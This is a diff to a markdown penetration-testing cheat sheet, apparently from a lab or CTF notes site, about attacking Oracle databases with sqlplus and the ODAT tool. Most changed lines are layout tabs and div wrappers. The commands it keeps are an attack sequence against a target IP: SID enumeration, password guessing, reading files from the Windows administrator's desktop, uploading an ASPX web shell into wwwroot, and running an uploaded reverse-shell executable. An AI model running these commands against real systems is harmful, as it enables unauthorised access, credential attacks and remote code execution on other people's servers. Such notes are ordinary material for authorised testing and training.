@@ -7,7 +7,11 @@ tags: ["oracle", "database", "1521", "sqlplus", "odat", "revshell", "rce"]
 ---
 ### Tools
 
-#### sqlplus
+{{< tab set1 tab1 active >}}sqlplus{{< /tab >}}
+{{< tab set1 tab2 >}}ODAT{{< /tab >}}
+{{< tabcontent set1 tab1 >}}
+
+<div>
 
 ```bash
 # Install
@@ -24,9 +28,12 @@ export LD_LIBRARY_PATH=/usr/lib/oracle/19.6/client64/lib${LD_LIBRARY_PATH:+:$LD_
 sqlplus -V
 ```
 
-#### ODAT (Oracle Database Attacking Tool)
+</div>
 
-[Download ODAT](https://github.com/quentinhardy/odat)
+{{< /tabcontent >}}
+{{< tabcontent set1 tab2 >}}
+
+<div>
 
 ```bash
 # Install
@@ -38,11 +45,19 @@ sudo apt install odat
 odat --version
 ```
 
+</div>
+
+<small>*Ref: [Download ODAT](https://github.com/quentinhardy/odat)*</small>
+
+{{< /tabcontent >}}
+
 <br>
 
 ---
 
 ### Enum
+
+<div>
 
 ```bash
 # SID enum (You only need one)
@@ -59,7 +74,11 @@ odat passwordguesser -s 10.10.11.10 -d <SID> --accounts-file accounts.txt
 odat all -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba
 ```
 
+</div>
+
 ### General
+
+<div>
 
 ```bash
 # Export everytime or add to ~/.zshrc
@@ -81,22 +100,34 @@ sqlplus <USER>/<PASSWORD>@10.10.11.10:1521/<SID> as sysdba
 select * from user_role_privs;
 ```
 
+</div>
+
 <br>
 
 ---
-#### Abuse #1: Arbitrary Read
+#### Arbitrary Read
+
+<div>
 
 ```bash
 odat ctxsys -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --getFile c:\\users\\administrator\\desktop\\file.txt
 ```
 
+</div>
+
 #### Upload File to RCE
+
+<div>
 
 ```bash
 odat dbmsadvisor -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --putFile C:\\inetpub\\wwwroot cmdasp.aspx /usr/share/webshells/aspx/cmdasp.aspx
 ```
 
+</div>
+
 #### Execute binary to RCE
+
+<div>
 
 ```bash
 # Create a malicious exe
@@ -112,5 +143,7 @@ odat utlfile -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --putFile 
 # Execute
 odat externaltable -s 10.10.11.10 -U <USER> -P <PASSWORD> -d <SID> --sysdba --exec \\Temp revshell.exe
 ```
+
+</div>
 
 <br>
